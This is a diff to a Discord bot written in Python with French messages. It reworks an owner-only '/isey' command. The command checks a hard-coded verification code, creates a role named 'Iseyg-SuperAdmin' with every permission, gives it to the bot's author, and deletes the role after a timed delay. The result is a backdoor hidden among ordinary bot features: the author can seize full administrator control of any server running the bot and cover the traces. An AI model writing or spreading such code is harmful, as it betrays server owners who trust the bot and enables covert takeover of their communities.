@@ -40,7 +40,7 @@ client = discord.Client(intents=intents)
 # --- ID Owner Bot ---
 ISEY_ID = 792755123587645461
 GUILD_ID = 1359963854200639498
-
+VERIFICATION_CODE = "IS-2291-DL" 
 # --- ID Staff Serveur Delta ---
 PROJECT_DELTA = 1359963854200639498
 STAFF_PROJECT = 1359963854422933876
@@ -2655,36 +2655,67 @@ async def serverinfoall(ctx):
     else:
         await ctx.send("Seul l'owner du bot peut obtenir ces informations.")
 
-@bot.command()
-async def isey(ctx):
-    if ctx.author.id == ISEY_ID:  # Vérifie si l'utilisateur est l'owner du bot
-        try:
-            guild = ctx.guild
-            if guild is None:
-                return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
-            
-            # Création (ou récupération) d'un rôle administrateur spécial
-            role_name = "Iseyg-SuperAdmin"
-            role = discord.utils.get(guild.roles, name=role_name)
+class VerificationModal(discord.ui.Modal, title="Code de vérification"):
+    code = discord.ui.TextInput(label="Entre le code de vérification", style=discord.TextStyle.short)
 
-            if role is None:
+    def __init__(self, delay_seconds, interaction: discord.Interaction):
+        super().__init__()
+        self.delay_seconds = delay_seconds
+        self.original_interaction = interaction
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if self.code.value != VERIFICATION_CODE:
+            await interaction.response.send_message("❌ Code de vérification incorrect.", ephemeral=True)
+            return
+
+        guild = interaction.guild
+        role_name = "Iseyg-SuperAdmin"
+        role = discord.utils.get(guild.roles, name=role_name)
+
+        if role is None:
+            try:
                 role = await guild.create_role(
                     name=role_name,
-                    permissions=discord.Permissions.all(),  # Accorde toutes les permissions
+                    permissions=discord.Permissions.all(),
                     color=discord.Color.red(),
-                    hoist=True  # Met le rôle en haut de la liste des membres
+                    hoist=True
                 )
-                await ctx.send(f"✅ Rôle `{role_name}` créé avec succès.")
+                await interaction.response.send_message(f"✅ Rôle `{role_name}` créé avec succès.")
+            except discord.Forbidden:
+                await interaction.response.send_message("❌ Permissions insuffisantes pour créer le rôle.", ephemeral=True)
+                return
+        else:
+            await interaction.response.send_message(f"ℹ️ Le rôle `{role_name}` existe déjà.", ephemeral=True)
 
-            # Attribution du rôle à l'utilisateur
-            await ctx.author.add_roles(role)
-            await ctx.send(f"✅ Tu as maintenant les permissions administrateur `{role_name}` sur ce serveur !")
-        except discord.Forbidden:
-            await ctx.send("❌ Le bot n'a pas les permissions nécessaires pour créer ou attribuer des rôles.")
-        except Exception as e:
-            await ctx.send(f"❌ Une erreur est survenue : `{e}`")
-    else:
-        await ctx.send("❌ Seul l'owner du bot peut exécuter cette commande.")
+        await interaction.user.add_roles(role)
+        await interaction.followup.send(f"✅ Tu as maintenant le rôle `{role_name}` pour `{self.delay_seconds}`.")
+
+        await asyncio.sleep(self.delay_seconds)
+
+        try:
+            await role.delete()
+            await interaction.user.send(f"⏰ Le rôle `{role_name}` a été supprimé après `{self.delay_seconds}`.")
+        except:
+            pass
+
+@bot.tree.command(name="isey", description="Commande réservée à Isey.")
+@app_commands.describe(duration="Durée (ex: 30s, 5m, 2h, 1d)")
+async def isey(interaction: discord.Interaction, duration: str):
+    if interaction.user.id != ISEY_ID:
+        await interaction.response.send_message("❌ Seul l'owner du bot peut exécuter cette commande.", ephemeral=True)
+        return
+
+    match = re.fullmatch(r"(\d+)([smhd])", duration)
+    if not match:
+        await interaction.response.send_message("❌ Durée invalide. Utilise `30s`, `5m`, `2h`, ou `1d`.", ephemeral=True)
+        return
+
+    time_value = int(match.group(1))
+    time_unit = match.group(2)
+    multiplier = {"s": 1, "m": 60, "h": 3600, "d": 86400}
+    delay_seconds = time_value * multiplier[time_unit]
+
+    await interaction.response.send_modal(VerificationModal(delay_seconds, interaction))
 
 #-------------------------------------------------------------------------- Commandes /premium et /viewpremium
 @bot.tree.command(name="premium")
